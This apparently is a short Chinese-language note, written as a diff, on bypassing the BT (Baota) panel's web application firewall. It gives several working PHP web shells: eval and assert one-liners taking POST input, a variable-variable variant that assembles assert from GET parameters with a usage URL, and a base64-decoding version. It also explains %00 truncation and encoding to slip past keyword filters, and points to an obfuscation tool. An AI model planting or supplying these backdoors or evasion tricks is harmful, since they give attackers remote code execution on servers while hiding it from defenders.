@@ -1,0 +1,38 @@
+WAF 绕过-权限控制之代码混淆及行为造轮子
+<?php @eval($_POST['x']); ?> 
+
+<?php assert($_POST['x']); ?>
+
+<?php
+
+    $a = $_GET['x']; 
+
+    $$a = $_GET['y']; 
+
+    $b($_POST['z']); 
+
+?>
+
+在服务器上使用 http://IP/1.php?x=b&y=assert 即可 
+这样赋值后$a=b $$a=assert=$b 所以直接变成了 assert($_POST[‘z’]);
+
+
+
+后门直接调用 system|phpinfo 等敏感字段时会被 BT 所拦截，尤其是 BT 的 WAF 会拦截 /* 字符的出现，在绕过时，就需要配合截断(%00)处理或者相关加密技术
+因为 BT 只对指定的字段进行加密，所以可以从加 密方面进行字段上的绕过 如典型的可逆的 base64 编码
+
+后门改一改
+<?php
+
+    $a = $_GET['x']; 
+
+    $$a = $_GET['y']; 
+
+    $b(base64_decode($_POST['z'])); 
+
+?>
+
+
+思路：既然可以加密传输，就会有其它加密的方法，就有了加密混淆使得 WAF 软件无 法检测到关键字段同样达到 WAF 的绕过 
+https://github.com/djunny/enphp
+
